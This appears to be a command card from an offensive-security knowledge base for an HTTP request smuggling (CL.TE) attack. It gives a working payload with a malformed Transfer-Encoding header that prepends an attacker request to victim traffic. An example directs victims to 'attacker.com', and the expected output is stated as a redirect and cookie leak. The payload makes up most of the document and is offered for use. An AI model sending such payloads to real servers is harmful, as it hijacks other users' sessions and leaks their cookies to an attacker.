---
data: |-
  GET / HTTP/1.1
  Transfer-Encoding : chunked
  Host: slackb.com
  User-Agent: Smuggler/v1.0
  Content-Length: 83

  0

  GET <URL> HTTP/1.1
  X: X
tags:
  - exploitation
  - http-request-smuggling
type: command
executor: http
platforms:
  - Web
id: 4b4c31c6-1c62-4e75-9479-5d5e0eb73a1e
created_at: '2025-12-11T06:10:33.348Z'
updated_at: '2025-12-11T06:10:33.348Z'
verified: false
validated: true
submitted: true
---
# http-smuggling-payload

## Command

```http
GET / HTTP/1.1
Transfer-Encoding : chunked
Host: slackb.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET <URL> HTTP/1.1
X: X
```

## Description

Sends a malicious HTTP request to exploit CL.TE smuggling by poisoning the socket and prepending a GET request to victim traffic.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Transfer-Encoding : chunked` | Malformed header to cause desync | Yes |
| `Content-Length: 83` | Specifies content length for frontend | Yes |
| `0` | Chunk terminator | Yes |
| `GET <URL> HTTP/1.1` | Prepended request to hijack | Yes |
| `X: X` | Custom header to erase victim request semantics | Yes |

## Examples

### Basic Usage

```http
GET / HTTP/1.1
Transfer-Encoding : chunked
Host: slackb.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET https://attacker.com HTTP/1.1
X: X
```

## Expected Output

No direct output, but triggers redirect and cookie leak to <URL>.

## Related

- [[commands/smuggler-discover-vuln]]
- [[procedures/Exploit-HTTP-Request-Smuggling-to-Poison-Backend-Socket]]
